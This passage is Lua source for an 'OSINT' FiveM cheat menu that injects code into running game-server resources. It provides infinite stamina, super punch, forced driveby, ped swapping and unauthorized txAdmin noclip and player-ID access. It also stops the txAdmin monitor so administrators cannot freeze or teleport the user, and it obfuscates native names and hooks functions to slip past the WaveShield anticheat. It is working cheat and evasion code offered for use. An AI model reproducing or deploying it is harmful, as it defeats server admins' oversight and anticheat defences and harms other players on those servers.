                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]])
                                end
                            end
                        },
                        { type = "checkbox", label = "Force Driveby", checked = false, desc = "This will enable driveby if disabled.",
                            onSelect = function(checked)
                                if checked then
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]])
                                else
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Infinite Stamina",
                            checked = false,
                            desc = "This will enable Infinite Stamina.",
                            onSelect = function(checked)
                                if checked then
                                    OSINT:Notify("success", "OSINT", "Infinite Stamina On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]])
                                    end
                                else
                                    OSINT:Notify("error", "OSINT", "Infinite Stamina Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.infiniteStaminaEnabled = false
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            _G.infiniteStaminaEnabled = false
                                        ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Tiny Ped",
                            checked = false,
                            desc = "This will turn you into a tiny ped.",
                            onSelect = function(checked)
                                local injectTarget =
                                    (GetResourceState("WaveShield") == "started" and "WaveShield") or
                                    (GetResourceState("monitor") == "started" and "monitor") or
                                    (GetResourceState("ox_lib") == "started" and "ox_lib") or
                                    "any"

                                if checked then
                                    Injection(injectTarget, [[
                                        if not _G.OSINTTinyPedInjected then
                                            _G.OSINTTinyPedInjected = true
                                            _G.OSINTTinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.OSINTTinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]])
                                else
                                    Injection(injectTarget, [[
                                        _G.OSINTTinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Super Punch",
                            checked = false,
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "Super Punch Enabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]])
                                        OSINT:Notify("success", "OSINT", "Super Punch Enabled (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        OSINT:Notify("error", "OSINT", "Super Punch Disabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            superPunchEnabled = false
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            superPunchEnabled = false
                                        ]])
                                        OSINT:Notify("error", "OSINT", "Super Punch Disabled (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        { type = "divider", label = "txAdmin Options" },
                        { type = "checkbox", label = "txAdmin Player IDs", checked = false, desc = "This will toggle txAdmin Player ids.",
                            onSelect = function(checked)
                                -- if GetResourceState("WaveShield") == "started" then
                                --     OSINT:Notify("error", "OSINT", "Ban Prevention: Cannot Use this on WaveShield", 3000)
                                --     return
                                -- end

                                if checked then
                                MachoInjectResource2(AsThreadNs, 'monitor', [[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]])
                                else
                                MachoInjectResource2(AsThreadNs, 'monitor', [[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "txAdmin Noclip",
                            checked = false,
                            desc = "This will toggle txAdmin noclip.",
                            onSelect = function(checked)
                                -- if GetResourceState("ReaperV4") == "started" or GetCurrentServerEndpoint() ~= "216.146.24.88:30120" then
                                --     OSINT:Notify("error", "OSINT", "Ban Prevention: Cannot Use this on ReaperV4", 3000)
                                --     return
                                -- end

                                if checked then
                                    if GetResourceState("WaveShield") == "started" then
                                        TriggerEvent("txcl:setPlayerMode", "noclip", true)
                                    else
                                        MachoInjectResource2(3, "monitor", [[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]])
                                    end
                                else
                                    if GetResourceState("WaveShield") == "started" then
                                        TriggerEvent("txcl:setPlayerMode", "none", true)
                                    else
                                        MachoInjectResource2(3, "monitor", [[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]])
                                    end
                                end
                            end,
                        },
                        { type = "checkbox", label = "Disable All txAdmin", checked = false, desc = "This will disable txAdmin options from admins using them against you.",
                            onSelect = function(checked)
                                if checked then
                                MachoResourceStop("monitor")
                                print('started')
                                else
                                print('stopped')
                                MachoResourceStart("monitor")
                                end
                            end
                        },                        
                        { type = "checkbox", label = "Disable txAdmin Teleport", checked = false, desc = "This will disable txAdmin Teleport.",
                            onSelect = function(checked)
                                if checked then
                                MachoResourceStop("monitor")
                                print('started')
                                else
                                print('stopped')
                                MachoResourceStart("monitor")
                                end
                            end
                        },
                        { type = "checkbox", label = "Disable txAdmin Freeze", checked = false, desc = "This will disable txAdmin Freeze.",
                            onSelect = function(checked)
                                if checked then
                                MachoResourceStop("monitor")
                                print('started')
                                else
                                print('stopped')
                                MachoResourceStart("monitor")
                                end
                            end
                        },
                    }
                },
                {
                    label = "Wardrobe",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Random" }, label = "Outfit", desc = "Apply a preset outfit",
                            onSelect = function(value)
                                if value == "Random" then
                                    Injection("any", [[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "Ped Options" },
                        {
                            type = "scrollable",
                            label = "Freemode",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Freemode Male", "Freemode Female"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(value))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Peds",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Michael", "Franklin", "Trevor", "Lamar", "Jimmy", "Amanda", "Tracey", "Ron", "Wade", "Dave Norton", 
                                "Steve Haines", "Devin Weston", "Floyd", "Chef", "Lester", "Chop", "Brad", 
                                "Police Officer Male", "Police Officer Female", "SWAT", "Sheriff Male", "Sheriff Female",
                                "Highway Cop", "FIB Male", "FIB Female", "Paramedic", "Firefighter", "Doctor",
                                "Construction Worker", "Pilot Male", "Pilot Female", "Business Male", "Business Female",
                                "Street Dealer", "Gang Male 1", "Gang Male 2", "Gang Female 1", "Ballas 1", "Ballas 2", "Ballas Female",
                                "Families 1", "Families 2", "Vagos 1", "Vagos 2", "Lost MC 1", "Lost MC 2", "Lost MC Female",
                                "Army Soldier", "Marine 1", "Marine 2", "Prisoner Male", "Prison Guard", "Cop Undercover",
                                "Security Guard", "Janitor", "Hobo Male", "Hobo Female", "Prostitute 1", "Prostitute 2",
                                "Beach Male", "Beach Female", "Tourist Male", "Tourist Female", "Skater", "Hipster Male", "Hipster Female",
                                "Bouncer", "Shopkeeper", "Chef", "Bartender", "Waiter", "Mechanic", "Taxi Driver", "Gardener", "Farmer",
                                "Dock Worker", "Trash Worker", "Postal Worker", "Bus Driver", "Pilot", "Air Hostess",
                                "Cop Traffic", "Cop Detective", "Agent", "Reporter", "News Cameraman",
                                "Hunter", "Hiker Male", "Hiker Female", "Golfer Male", "Golfer Female", "Tennis Player Male", "Tennis Player Female"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(value))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Animal Peds",
                            scrollType = "onEnter",
                            value = 1,
                            values = { 
                                "Boar", "Cat", "Chicken", "Chimp", "Cow", "Coyote", "Crow", 
                                "Deer", "Dolphin", "Fish", "Hen", "Humpback", "Husky", 
                                "Killer Whale", "Mountain Lion", "Pig", "Pigeon", "Poodle", 
                                "Pug", "Poodle", "Rabbit", "Rat", "Retriever", "Rhesus Monkey",
                                "Rottweiler", "Seagull", "Shepherd", "Stingray", "Tiger Shark", 
                                "Hammerhead Shark", "Cow", "Cat2", "Chickenhawk", "Cormorant",
                                "Coyote2", "Chimp2", "Boar2", "Deer2", "Fish2", "Husky2",
                                "Pug2", "Poodle2", "Retriever2", "Shepherd2", "Rat2", "Rabbit2",
                                "Dolphin2", "Killer Whale2", "Mountain Lion2", "Pig2", "Seagull2",
                                "Stingray2", "Tiger Shark2", "Hammerhead Shark2"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
